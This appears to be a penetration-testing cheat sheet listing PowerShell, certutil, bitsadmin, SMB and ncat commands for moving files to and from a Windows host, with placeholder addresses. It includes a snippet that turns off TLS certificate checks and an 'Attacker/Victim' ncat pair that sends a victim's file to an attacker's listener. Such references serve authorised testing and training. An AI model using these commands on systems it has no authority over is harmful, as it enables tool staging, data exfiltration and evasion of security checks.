
### Downloading via built-in Windows Utilities
---

```powershell
# Built in Certutil Utility
certutil -urlcache -f http://<ip_addr>/<filename> <outfile>

# Built in bitsadmin Utility
bitsadmin /TRANSFER <job_name> http://<ip_addr>/<filename> "$PWD/<outfile>"

# Native PowerShell Command
Invoke-WebRequest http://<ip_addr>/<filename> -UseBasicParsing -OutFile <outfile>
```

### Downloading and Uploading via PowerShell
---

```powershell
### PowerShell 2.0+ WebClient
# Download File from Web Server
(New-Object System.Net.WebClient).DownloadFile("http(s)://<ip_addr>/<filename>","<outfile>")

# Upload File top Web Server
(New-Object System.Net.WebClient).UploadFile("http(s)://<ip_addr>/<filename>","<outfile>")


### PowerShell 5.0+ WebClient
# Download Filr from Web Server
[System.Net.WebClient]::new().DownloadFile("http(s)://<ip_addr>/<filename>","<outfile>")

# Upload File to Web Server
[System.Net.WebClient]::new().UploadFile("http(s)://<ip_addr>/<filename>","<file_path>")


### Advanced: PoorMansArmory HTTPS File Transfer Support
# Bypass the WebClient self-signed certificate check within the current session
$Bypass = @'
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static void Bypass()
    {
        ServicePointManager.ServerCertificateValidationCallback =
            delegate
            (
                Object obj,
                X509Certificate certificate,
                X509Chain chain,
                SslPolicyErrors errors
            )
            {
                return true;
            };
    }
}
'@
Add-Type $Bypass;
[SelfSignedCerts]::Bypass();
```

### Downloading and Uploading via SMB
---

```powershell
# Download File from Share
copy \\<ip_addr>\<share_name>\<filename> <outfile>

# Upload File to Share
copy <filename> \\<ip_addr>\<share_name>\<filename>
```

### Alternative Methods
---

```powershell
### Using ncat.exe
# Attacker: Create Listener waiting for File
nc -nvlp <port> > <outfile>

# Victim: Upload File Bytes
type <filename> | ./nc.exe <ip_addr> <port>
```